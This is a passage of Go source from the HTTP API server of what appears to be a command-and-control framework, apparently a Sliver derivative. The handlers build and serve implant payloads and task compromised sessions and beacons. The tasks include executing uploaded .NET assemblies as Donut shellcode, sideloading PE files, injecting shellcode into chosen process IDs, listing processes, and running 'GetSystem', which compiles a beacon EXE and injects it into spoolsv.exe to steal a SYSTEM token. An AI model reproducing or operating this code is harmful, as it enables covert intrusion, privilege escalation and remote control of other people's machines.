		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", fileName))
	w.Header().Set("X-Implant-Name", fileName)
	w.Header().Set("X-Implant-Size", strconv.Itoa(len(fileData)))
	w.WriteHeader(http.StatusOK)
	w.Write(fileData)
}

func handleListImplantBuilds(w http.ResponseWriter, r *http.Request) {
	limit, offset := parsePagination(r)
	builds, err := db.ImplantBuilds()
	if err != nil {
		apiLog.Errorf("ImplantBuilds: %v", err)
		writeError(w, http.StatusInternalServerError, "failed to list builds")
		return
	}

	type buildDTO struct {
		Name           string `json:"name"`
		OS             string `json:"os"`
		Arch           string `json:"arch"`
		Format         string `json:"format"`
		IsBeacon       bool   `json:"isBeacon"`
		BeaconInterval int64  `json:"beaconInterval"`
		BeaconJitter   int64  `json:"beaconJitter"`
	}
	all := make([]buildDTO, 0, len(builds))
	for _, b := range builds {
		c := b.ImplantConfig
		all = append(all, buildDTO{
			Name:           b.Name,
			OS:             c.GOOS,
			Arch:           c.GOARCH,
			Format:         formatLabel(c.GOOS, c.Format),
			IsBeacon:       c.IsBeacon,
			BeaconInterval: c.BeaconInterval,
			BeaconJitter:   c.BeaconJitter,
		})
	}
	page := applySlice(all, limit, offset)

	type paginatedBuilds struct {
		Items  []buildDTO `json:"items"`
		Total  int        `json:"total"`
		Limit  int        `json:"limit"`
		Offset int        `json:"offset"`
	}
	writeJSON(w, http.StatusOK, paginatedBuilds{Items: page, Total: len(all), Limit: limit, Offset: offset})
}

func requireWindows(w http.ResponseWriter, osName, action string) bool {
	if !strings.EqualFold(osName, "windows") {
		writeError(w, http.StatusBadRequest, fmt.Sprintf("%s is only supported on Windows targets", action))
		return false
	}
	return true
}

// --- Helpers ---

func parseOutputFormat(format string) clientpb.OutputFormat {
	switch format {
	case "exe", "executable":
		return clientpb.OutputFormat_EXECUTABLE
	case "dll", "shared":
		return clientpb.OutputFormat_SHARED_LIB
	case "shellcode":
		return clientpb.OutputFormat_SHELLCODE
	case "service":
		return clientpb.OutputFormat_SERVICE
	default:
		return clientpb.OutputFormat_EXECUTABLE
	}
}

func randomPayloadID() string {
	return fmt.Sprintf("%08x", rand.Uint32())
}

// --- Payload store DTO ---

type payloadRecord struct {
	ID             string    `json:"id"`
	Name           string    `json:"name"`
	OS             string    `json:"os"`
	Arch           string    `json:"arch"`
	Format         string    `json:"format"`
	Listener       string    `json:"listener"`
	IsBeacon       bool      `json:"isBeacon"`
	BeaconInterval int64     `json:"beaconInterval,omitempty"`
	BeaconJitter   int64     `json:"beaconJitter,omitempty"`
	Size           int64     `json:"size"`
	CreatedAt      time.Time `json:"createdAt"`
	// Path is internal, never serialised to clients.
	Path string `json:"-"`
}

// --- Payload handlers ---

func (s *HTTPServer) handleListPayloads(w http.ResponseWriter, r *http.Request) {
	limit, offset := parsePagination(r)
	all := s.payloads.list()
	page := applySlice(all, limit, offset)
	type paginatedPayloads struct {
		Items  []payloadRecord `json:"items"`
		Total  int             `json:"total"`
		Limit  int             `json:"limit"`
		Offset int             `json:"offset"`
	}
	writeJSON(w, http.StatusOK, paginatedPayloads{Items: page, Total: len(all), Limit: limit, Offset: offset})
}

func (s *HTTPServer) handleGetPayload(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	rec, ok := s.payloads.get(id)
	if !ok {
		writeError(w, http.StatusNotFound, "payload not found")
		return
	}
	writeJSON(w, http.StatusOK, rec)
}

func (s *HTTPServer) handleDeletePayload(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	rec, ok := s.payloads.get(id)
	if !ok {
		writeError(w, http.StatusNotFound, "payload not found")
		return
	}
	if rec.Path != "" {
		if err := os.Remove(rec.Path); err != nil && !os.IsNotExist(err) {
			apiLog.Warnf("failed to delete payload file %s: %v", rec.Path, err)
		}
	}

	buildName := strings.TrimSuffix(rec.Name, filepath.Ext(rec.Name))
	if build, err := db.ImplantBuildByName(buildName); err == nil {
		generate.ImplantFileDelete(build)
		deleteImplantBuildFromDB(build)
	}

	s.payloads.delete(id)
	s.persistPayloads()
	writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
}

func deleteImplantBuildFromDB(build *models.ImplantBuild) {
	dbSess := db.Session()
	if build.ImplantConfig.ID != (uuid.UUID{}) {
		dbSess.Where("implant_config_id = ?", build.ImplantConfig.ID).Delete(&models.ImplantC2{})
		dbSess.Where("implant_config_id = ?", build.ImplantConfig.ID).Delete(&models.CanaryDomain{})
		dbSess.Delete(&build.ImplantConfig)
	}
	if err := dbSess.Delete(build).Error; err != nil {
		apiLog.Warnf("failed to delete implant build %s: %v", build.Name, err)
	} else {
		apiLog.Infof("deleted implant build %s from DB", build.Name)
	}
}

func (s *HTTPServer) handleDownloadPayload(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	rec, ok := s.payloads.get(id)
	if !ok {
		writeError(w, http.StatusNotFound, "payload not found")
		return
	}
	if rec.Path == "" {
		writeError(w, http.StatusGone, "payload file not available")
		return
	}
	data, err := os.ReadFile(rec.Path)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to read payload file")
		return
	}
	w.Header().Del("Content-Type")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, rec.Name))
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func (s *HTTPServer) handleCreatePayload(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name           string `json:"name"`
		OS             string `json:"os"`
		Arch           string `json:"arch"`
		Format         string `json:"format"`
		C2             string `json:"listener"`
		IsBeacon       bool   `json:"isBeacon"`
		Debug          bool   `json:"debug"`
		BeaconInterval int64  `json:"beaconInterval"`
		BeaconJitter   int64  `json:"beaconJitter"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if req.OS == "" || req.Arch == "" || req.Format == "" {
		writeError(w, http.StatusBadRequest, "os, arch and format are required")
		return
	}

	fPath, _, err := buildImplant(req.Name, req.OS, req.Arch, req.Format, req.C2, req.IsBeacon, req.Debug, req.BeaconInterval, req.BeaconJitter)
	if err != nil {
		apiLog.Errorf("Create payload: %v", err)
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	id := randomPayloadID()
	implantName := filepath.Base(fPath)
	baseName := strings.TrimSuffix(implantName, filepath.Ext(implantName))
	dstName := baseName + implantExtension(req.OS, req.Format)
	destPath := filepath.Join(s.payloadsDir, id+"-"+dstName)
	if err := copyFilePayload(fPath, destPath); err != nil {
		apiLog.Errorf("copy payload: %v", err)
		writeError(w, http.StatusInternalServerError, "failed to save payload")
		return
	}

	info, _ := os.Stat(destPath)
	rec := payloadRecord{
		ID:             id,
		Name:           dstName,
		OS:             req.OS,
		Arch:           req.Arch,
		Format:         formatLabel(req.OS, parseOutputFormat(req.Format)),
		Listener:       req.C2,
		IsBeacon:       req.IsBeacon,
		BeaconInterval: req.BeaconInterval,
		BeaconJitter:   req.BeaconJitter,
		Size:           info.Size(),
		CreatedAt:      time.Now().UTC(),
		Path:           destPath,
	}
	s.payloads.add(rec)
	s.persistPayloads()

	core.EventBroker.Publish(core.Event{
		EventType: consts.BuildCompletedEvent,
		Data:      []byte(dstName),
	})

	writeJSON(w, http.StatusCreated, rec)
}

func copyFilePayload(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0o644)
}

// parseBeaconTaskOutput tries multiple protobuf response types to extract output from a beacon task.
func parseBeaconTaskOutput(data []byte) string {
	// Try raw Execute (shell commands)
	var execResp konjiyamipb.Execute
	if err := proto.Unmarshal(data, &execResp); err == nil && (len(execResp.Stdout) > 0 || len(execResp.Stderr) > 0) {
		out := string(execResp.Stdout)
		if len(execResp.Stderr) > 0 {
			if out != "" {
				out += "\n"
			}
			out += string(execResp.Stderr)
		}
		return out
	}
	// Try ExecuteAssembly
	var asmResp konjiyamipb.ExecuteAssembly
	if err := proto.Unmarshal(data, &asmResp); err == nil && len(asmResp.Output) > 0 {
		return string(asmResp.Output)
	}
	// Try Sideload
	var sideResp konjiyamipb.Sideload
	if err := proto.Unmarshal(data, &sideResp); err == nil && sideResp.Result != "" {
		return sideResp.Result
	}
	// Try Ps (process list)
	var psResp konjiyamipb.Ps
	if err := proto.Unmarshal(data, &psResp); err == nil && len(psResp.Processes) > 0 {
		lines := make([]string, 0, len(psResp.Processes)+1)
		lines = append(lines, fmt.Sprintf("%-8s %-8s %-30s %s", "PID", "PPID", "EXECUTABLE", "OWNER"))
		for _, p := range psResp.Processes {
			lines = append(lines, fmt.Sprintf("%-8d %-8d %-30s %s", p.Pid, p.Ppid, p.Executable, p.Owner))
		}
		return strings.Join(lines, "\n")
	}
	// Try Envelope wrapper (legacy)
	envelope := &konjiyamipb.Envelope{}
	if err := proto.Unmarshal(data, envelope); err == nil && len(envelope.Data) > 0 {
		return parseBeaconTaskOutput(envelope.Data)
	}
	return ""
}

// ──────────────────────────────────────────────────────────────────────
// Sprint 8a: Execution endpoints
// ──────────────────────────────────────────────────────────────────────

const (
	execRPCTimeout = 60 * time.Second
	execHardLimit  = 65 * time.Second
	maxExecUpload  = 50 << 20 // 50 MB
)

// readUploadedFile extracts the "file" field from a multipart/form-data request.
func readUploadedFile(r *http.Request) ([]byte, string, error) {
	r.Body = http.MaxBytesReader(nil, r.Body, maxExecUpload)
	if err := r.ParseMultipartForm(maxExecUpload); err != nil {
		return nil, "", fmt.Errorf("file too large or invalid form: %w", err)
	}
	file, header, err := r.FormFile("file")
	if err != nil {
		return nil, "", fmt.Errorf("file field is required: %w", err)
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read file: %w", err)
	}
	return data, header.Filename, nil
}

// ── Execute Assembly (session sync) ──

func handleExecAssemblySession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	if !requireWindows(w, session.OS, "Execute Assembly") {
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	arguments := r.FormValue("arguments")
	process := r.FormValue("process")
	if process == "" {
		process = `c:\windows\system32\notepad.exe`
	}
	isDLL := r.FormValue("isDLL") == "true"

	shellcode, err := generate.DonutFromAssembly(fileData, isDLL, session.Arch, arguments, "", "", "")
	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("donut conversion failed: %v", err))
		return
	}

	req := &konjiyamipb.InvokeExecuteAssemblyReq{
		Data:    shellcode,
		Process: process,
		Request: &commonpb.Request{Timeout: int64(execRPCTimeout)},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}

	apiLog.Infof("[exec-assembly] session=%s file=%s args=%q process=%s", session.ID, filename, arguments, process)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(req), execRPCTimeout, execHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.ExecuteAssembly
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":     false,
			"error":  resp.Response.Err,
			"output": string(resp.Output),
		})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":     true,
		"output": string(resp.Output),
	})
}

// ── Execute Assembly (beacon async) ──

func handleExecAssemblyBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	if !requireWindows(w, beacon.OS, "Execute Assembly") {
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	arguments := r.FormValue("arguments")
	process := r.FormValue("process")
	if process == "" {
		process = `c:\windows\system32\notepad.exe`
	}
	isDLL := r.FormValue("isDLL") == "true"

	shellcode, err := generate.DonutFromAssembly(fileData, isDLL, beacon.Arch, arguments, "", "", "")
	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("donut conversion failed: %v", err))
		return
	}

	req := &konjiyamipb.InvokeExecuteAssemblyReq{
		Data:    shellcode,
		Process: process,
		Request: &commonpb.Request{},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(req),
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = fmt.Sprintf("execute-assembly %s %s", filename, arguments)
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	apiLog.Infof("[exec-assembly] beacon=%s file=%s taskID=%s", beacon.ID, filename, task.ID)
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

// ── Sideload (session sync) ──

func handleSideloadSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	if !requireWindows(w, session.OS, "Sideload") {
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	entryPoint := r.FormValue("entryPoint")
	processName := r.FormValue("processName")
	args := r.FormValue("args")
	isDLL := r.FormValue("isDLL") == "true"
	kill := r.FormValue("kill") == "true"

	data := fileData
	if strings.EqualFold(session.OS, "windows") {
		shellcode, convErr := generate.DonutShellcodeFromPE(fileData, session.Arch, false, args, "", entryPoint, isDLL, false, false)
		if convErr != nil {
			writeError(w, http.StatusInternalServerError, fmt.Sprintf("donut conversion failed: %v", convErr))
			return
		}
		data = shellcode
	}

	req := &konjiyamipb.SideloadReq{
		Data:        data,
		ProcessName: processName,
		Args:        args,
		EntryPoint:  entryPoint,
		Kill:        kill,
		IsDLL:       isDLL,
		Request:     &commonpb.Request{Timeout: int64(execRPCTimeout)},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}

	apiLog.Infof("[sideload] session=%s file=%s entry=%s", session.ID, filename, entryPoint)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(req), execRPCTimeout, execHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Sideload
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":     false,
			"error":  resp.Response.Err,
			"output": resp.Result,
		})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":     true,
		"output": resp.Result,
	})
}

// ── Sideload (beacon async) ──

func handleSideloadBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	if !requireWindows(w, beacon.OS, "Sideload") {
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	entryPoint := r.FormValue("entryPoint")
	processName := r.FormValue("processName")
	args := r.FormValue("args")
	isDLL := r.FormValue("isDLL") == "true"

	data := fileData
	if strings.EqualFold(beacon.OS, "windows") {
		shellcode, convErr := generate.DonutShellcodeFromPE(fileData, beacon.Arch, false, args, "", entryPoint, isDLL, false, false)
		if convErr != nil {
			writeError(w, http.StatusInternalServerError, fmt.Sprintf("donut conversion failed: %v", convErr))
			return
		}
		data = shellcode
	}

	req := &konjiyamipb.SideloadReq{
		Data:        data,
		ProcessName: processName,
		Args:        args,
		EntryPoint:  entryPoint,
		IsDLL:       isDLL,
		Request:     &commonpb.Request{},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(req),
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = fmt.Sprintf("sideload %s", filename)
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	apiLog.Infof("[sideload] beacon=%s file=%s taskID=%s", beacon.ID, filename, task.ID)
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

// ── Shellcode Inject (session sync) ──

func handleInjectSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	pid, _ := strconv.ParseUint(r.FormValue("pid"), 10, 32)
	rwx := r.FormValue("rwx") == "true"
	encoder := r.FormValue("encoder")

	req := &konjiyamipb.TaskReq{
		Data:     fileData,
		Pid:      uint32(pid),
		RWXPages: rwx,
		Encoder:  encoder,
		Request:  &commonpb.Request{Timeout: int64(execRPCTimeout)},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}

	apiLog.Infof("[inject] session=%s file=%s pid=%d", session.ID, filename, pid)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(req), execRPCTimeout, execHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Task
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":    false,
			"error": resp.Response.Err,
		})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":     true,
		"output": "shellcode injected successfully",
	})
}

// ── Shellcode Inject (beacon async) ──

func handleInjectBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	fileData, filename, err := readUploadedFile(r)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	pid, _ := strconv.ParseUint(r.FormValue("pid"), 10, 32)
	rwx := r.FormValue("rwx") == "true"
	encoder := r.FormValue("encoder")

	req := &konjiyamipb.TaskReq{
		Data:     fileData,
		Pid:      uint32(pid),
		RWXPages: rwx,
		Encoder:  encoder,
		Request:  &commonpb.Request{},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(req),
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = fmt.Sprintf("inject %s → pid %d", filename, pid)
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	apiLog.Infof("[inject] beacon=%s file=%s pid=%d taskID=%s", beacon.ID, filename, pid, task.ID)
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

// ── Process List (session sync) ──

func handlePsSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	req := &konjiyamipb.PsReq{
		Request: &commonpb.Request{Timeout: int64(execRPCTimeout)},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	apiLog.Infof("[ps] session=%s", session.ID)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, konjiyamipb.MsgNumber(req), execRPCTimeout, execHardLimit, reqData)
	if err != nil {
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	var resp konjiyamipb.Ps
	if err := proto.Unmarshal(respData, &resp); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":    false,
			"error": resp.Response.Err,
		})
		return
	}

	type processDTO struct {
		Pid          int32    `json:"pid"`
		Ppid         int32    `json:"ppid"`
		Executable   string   `json:"executable"`
		Owner        string   `json:"owner"`
		Architecture string   `json:"architecture"`
		SessionID    int32    `json:"sessionId"`
		CmdLine      []string `json:"cmdLine,omitempty"`
	}
	procs := make([]processDTO, 0, len(resp.Processes))
	for _, p := range resp.Processes {
		procs = append(procs, processDTO{
			Pid:          p.Pid,
			Ppid:         p.Ppid,
			Executable:   p.Executable,
			Owner:        p.Owner,
			Architecture: p.Architecture,
			SessionID:    p.SessionID,
			CmdLine:      p.CmdLine,
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":        true,
		"processes": procs,
	})
}

// ── Process List (beacon async) ──

func handlePsBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	req := &konjiyamipb.PsReq{
		Request: &commonpb.Request{},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(req),
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = "ps"
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	apiLog.Infof("[ps] beacon=%s taskID=%s", beacon.ID, task.ID)
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

// getImplantPayload retrieves a raw EXE for GetSystem token theft.
// Priority: existing session-mode EXE build → compile a fresh session-mode EXE.
// The implant detects the MZ header and uses token theft instead of shellcode injection.
func getImplantPayload(name, configID string) ([]byte, error) {
	builds, err := db.ImplantBuilds()
	if err != nil || len(builds) == 0 {
		return nil, fmt.Errorf("no implant builds in DB — generate an implant first")
	}

	// Always compile fresh for GetSystem so the payload gets DebugFile + latest fixes.
	// Find source build config to compile a fresh EXE
	var source *models.ImplantBuild
	for _, b := range builds {
		if name != "" && b.Name == name {
			source = b
			break
		}
		if configID != "" && b.ImplantConfig.ID.String() == configID {
			source = b
			break
		}
	}
	if source == nil {
		source = builds[0]
	}

	var c2URLs []string
	for _, c := range source.ImplantConfig.C2 {
		c2URLs = append(c2URLs, c.URL)
	}
	apiLog.Infof("[getsystem-payload] source=%s C2=%v — compiling beacon EXE...", source.Name, c2URLs)

	exeData, err := compileBeaconEXE(&source.ImplantConfig)
	if err != nil {
		return nil, fmt.Errorf("compile beacon EXE: %v", err)
	}
	apiLog.Infof("[getsystem-payload] compiled beacon EXE, len=%d", len(exeData))
	return exeData, nil
}

// compileBeaconEXE compiles a fresh beacon-mode EXE implant for GetSystem token theft.
func compileBeaconEXE(sourceConfig *models.ImplantConfig) ([]byte, error) {
	config := *sourceConfig
	config.ID = uuid.UUID{}
	config.ImplantBuildID = uuid.UUID{}
	config.Format = clientpb.OutputFormat_EXECUTABLE
	config.ObfuscateSymbols = false
	config.IsShellcode = false
	config.IsBeacon = true
	config.BeaconInterval = int64(10 * time.Second)
	config.BeaconJitter = int64(2 * time.Second)
	config.Debug = false
	config.DebugFile = ""
	config.MaxConnectionErrors = 1000
	config.ReconnectInterval = int64(60 * time.Second)

	newC2 := make([]models.ImplantC2, len(config.C2))
	for i, c := range config.C2 {
		newC2[i] = models.ImplantC2{Priority: c.Priority, URL: c.URL, Options: c.Options}
	}
	config.C2 = newC2

	if len(config.C2) == 0 {
		return nil, fmt.Errorf("source config has no C2 URLs")
	}

	var exeName string
	for attempt := 0; attempt < 10; attempt++ {
		candidate, err := codenames.GetCodename()
		if err != nil {
			return nil, fmt.Errorf("codename: %v", err)
		}
		if _, err := db.ImplantBuildByName(candidate); err != nil {
			exeName = candidate
			break
		}
	}
	if exeName == "" {
		exeName = fmt.Sprintf("IMPLANT_%d", time.Now().UnixMilli())
	}

	otpSecret, err := cryptography.TOTPServerSecret()
	if err != nil {
		return nil, fmt.Errorf("totp: %v", err)
	}

	apiLog.Infof("[getsystem-compile] name=%s beacon=true interval=%dms jitter=%dms debug=%v",
		exeName, config.BeaconInterval/1e6, config.BeaconJitter/1e6, config.Debug)

	// save=true so the implant's ECC keys are stored in the DB — the server
	// needs them to validate the HTTP session init from the SYSTEM beacon.
	if err := generate.GenerateConfig(exeName, &config, true); err != nil {
		return nil, fmt.Errorf("generate config: %v", err)
	}

	exePath, err := generate.KONJIYAMIExecutable(exeName, otpSecret, &config, false)
	if err != nil {
		return nil, fmt.Errorf("compile: %v", err)
	}
	return os.ReadFile(exePath)
}

// ── GetSystem (session sync) ──

func handleGetSystemSession(w http.ResponseWriter, r *http.Request) {
	session := sessionAlive(w, mux.Vars(r)["id"])
	if session == nil {
		return
	}
	if !requireWindows(w, session.OS, "GetSystem") {
		return
	}
	var body struct {
		HostingProcess string `json:"hostingProcess"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.HostingProcess == "" {
		body.HostingProcess = "spoolsv.exe"
	}

	apiLog.Infof("[getsystem] session=%s name=%s configID=%s host=%s — resolving payload...", session.ID, session.Name, session.ConfigID, body.HostingProcess)
	payload, err := getImplantPayload(session.Name, session.ConfigID)
	if err != nil {
		apiLog.Warnf("[getsystem] payload lookup failed: %v", err)
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("getsystem requires implant payload: %v", err))
		return
	}
	apiLog.Infof("[getsystem] payload resolved, len=%d bytes (MZ=%v)", len(payload), len(payload) > 2 && payload[0] == 'M' && payload[1] == 'Z')

	req := &konjiyamipb.InvokeGetSystemReq{
		Data:           payload,
		HostingProcess: body.HostingProcess,
		Request:        &commonpb.Request{Timeout: int64(execRPCTimeout)},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	msgType := konjiyamipb.MsgNumber(req)
	apiLog.Infof("[getsystem] sending to implant: msgType=%d payloadLen=%d host=%q", msgType, len(payload), body.HostingProcess)
	session.Connection.UpdateLastMessage()
	respData, err := requestWithTimeout(session, msgType, execRPCTimeout, execHardLimit, reqData)
	if err != nil {
		apiLog.Warnf("[getsystem] implant error: %v", err)
		writeError(w, http.StatusRequestTimeout, err.Error())
		return
	}
	apiLog.Infof("[getsystem] implant responded, len=%d", len(respData))
	var resp konjiyamipb.GetSystem
	if err := proto.Unmarshal(respData, &resp); err != nil {
		apiLog.Warnf("[getsystem] failed to parse response (%d bytes): %v", len(respData), err)
		writeError(w, http.StatusInternalServerError, "failed to parse response")
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		apiLog.Warnf("[getsystem] implant returned error: %s", resp.Response.Err)
		writeJSON(w, http.StatusOK, map[string]any{
			"ok":    false,
			"error": resp.Response.Err,
		})
		return
	}
	apiLog.Infof("[getsystem] injection succeeded — waiting for new SYSTEM session callback")
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":     true,
		"output": "getsystem executed — new SYSTEM session should appear",
	})
}

// ── GetSystem (beacon async) ──

func handleGetSystemBeacon(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	beacon, err := db.BeaconByID(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "beacon not found")
		return
	}
	if !requireWindows(w, beacon.OS, "GetSystem") {
		return
	}
	var body struct {
		HostingProcess string `json:"hostingProcess"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.HostingProcess == "" {
		body.HostingProcess = "spoolsv.exe"
	}

	apiLog.Infof("[getsystem] beacon=%s name=%s host=%s — resolving payload...", beacon.ID, beacon.Name, body.HostingProcess)
	payload, err := getImplantPayload(beacon.Name, "")
	if err != nil {
		apiLog.Warnf("[getsystem] payload lookup failed for beacon: %v", err)
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("getsystem requires implant payload: %v", err))
		return
	}
	apiLog.Infof("[getsystem] beacon payload resolved, len=%d bytes", len(payload))

	req := &konjiyamipb.InvokeGetSystemReq{
		Data:           payload,
		HostingProcess: body.HostingProcess,
		Request:        &commonpb.Request{},
	}
	reqData, err := proto.Marshal(req)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to build request")
		return
	}
	task, err := beacon.Task(&konjiyamipb.Envelope{
		Type: konjiyamipb.MsgNumber(req),
		Data: reqData,
	})
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create task")
		return
	}
	task.Description = "getsystem"
	if err := db.Session().Save(task).Error; err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save task")
		return
	}
	apiLog.Infof("[getsystem] beacon=%s taskID=%s payloadLen=%d", beacon.ID, task.ID, len(payload))
	writeJSON(w, http.StatusCreated, beaconTaskToDTO(task, false))
}

// --- Artifact handler ---

func (s *HTTPServer) handleArtifact(w http.ResponseWriter, r *http.Request) {
